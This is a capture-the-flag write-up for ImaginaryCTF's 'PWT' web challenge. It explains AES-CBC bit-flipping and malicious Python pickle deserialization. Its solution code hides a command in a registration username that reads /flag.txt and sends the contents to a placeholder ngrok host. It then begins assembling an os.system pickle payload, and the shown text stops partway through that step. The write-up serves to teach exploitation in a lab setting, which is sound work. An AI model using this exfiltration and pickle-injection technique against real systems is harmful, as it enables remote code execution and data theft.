# PWT — ImaginaryCTF Writeup

**Challenge:** PWT  
**Category:** Web  
**Difficulty:** Hard  
**Points:** 80 pts  
**Flag:** `ictf{m1Sc_X_W3b_X_cryPt0=P1CKL3}`

---

## Background Knowledge (Read This First!)

### What is PWT (Pickle Web Token)?

**PWT** is a custom authentication scheme using Python's **pickle** serialization format and **AES-CBC** encryption — instead of standard JWT.

### What is AES-CBC Bit-Flipping?

In **AES-CBC mode**, each ciphertext block depends on the previous one via XOR. This creates a vulnerability:

If you flip bits in block `N` of the ciphertext, the corresponding bits in the **plaintext of block N+1** get flipped (and block N becomes garbage).

This allows injecting arbitrary bytes into the plaintext — at the cost of corrupting the previous block.

### What is the Pickle Attack?

Python's `pickle` module serializes Python objects. Malicious pickle payloads can execute **arbitrary code** when deserialized. By injecting a pickle `GLOBAL` opcode that calls `os.system`, you get RCE.

### What is the MEMOIZE Trick?

`pickle.dumps` adds `MEMOIZE` opcodes automatically. The `BINGET` opcode retrieves memoized values, allowing you to reference the first serialized object (the username — which contains your command) without re-serializing it.

---

## Solution

### Step 1 — Register with a username containing the command

```python
import requests
from base64 import b64encode, b64decode
import pickle
from struct import pack

URL  = "http://155.248.210.243:42105/"
EVIL = "https://your-server.ngrok.app/"

cmd  = "cat /flag.txt"
code = f"python -c "from urllib.request import urlopen;import os;urlopen('{EVIL}',data=os.popen('{cmd}').read().encode())""

s = requests.session()
r = s.post(URL + "register", data={
    "username": code + " " * (16 - (len(code) % 16))
})
```

### Step 2 — Craft the CBC bit-flip payload

```python
payload = (
    pickle.GLOBAL + b"os
system
" +
    pickle.BINGET + pack('b', 0) +
    pickle.TUPLE1 +
    pickle.REDUCE +
    b"
